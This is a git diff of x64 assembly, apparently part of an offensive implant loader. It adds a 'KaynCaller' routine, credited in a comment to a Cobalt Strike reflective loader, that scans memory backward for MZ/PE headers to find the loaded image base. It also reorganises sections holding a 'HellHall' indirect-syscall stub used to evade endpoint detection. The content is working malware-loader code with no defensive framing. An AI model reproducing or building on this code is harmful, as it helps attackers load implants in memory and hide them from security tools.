@@ -5,6 +5,7 @@ global Start
 global GetRIP
 global HellHall
 global SetConfig
+global KaynCaller
 
 section .text$A
     Start:
@@ -19,6 +20,33 @@ section .text$A
         pop	rsi
     ret
 
+section .text$B
+
+    ; Shameless copied from Bobby Cooke CobaltStrikeReflectiveLoader (https://github.com/boku7/CobaltStrikeReflectiveLoader)
+
+    ; I think this returns the addr of KaynCaller - dylan
+    KaynCaller:
+        call pop
+        pop:
+        pop rcx    
+
+    ; I think this goes up to find DOS header and try to check if e_lfanew offset returns nt header - dylan
+    loop:
+        xor r11, r11                ; rbx -> r11
+        mov r11d, 0x5A4D            ; ebx -> r11d
+        dec rcx
+        cmp r11w,  word ds:[ rcx ]  ; bx -> r11w
+        jne loop
+        xor rax, rax
+        mov ax,  [ rcx + 0x3C ]
+        add rax, rcx
+        xor r11, r11
+        add r11w,  0x4550             ; bx -> r11w
+        cmp r11w,  word ds:[ rax ]    ; bx -> r11w
+        jne loop
+        mov rax, rcx
+    ret
+
 section .text$F
     GetRIP:
         call    retptr
@@ -28,13 +56,13 @@ section .text$F
         sub	rax, 5
     ret
 
-section .text$E
+section .text$C
     SetConfig:
     	mov r10d, ecx
         mov r11, rdx			
         ret
-        
-section .text$E
+
+section .text$C
     HellHall:
         mov eax, r10d		
         mov r10, rcx	
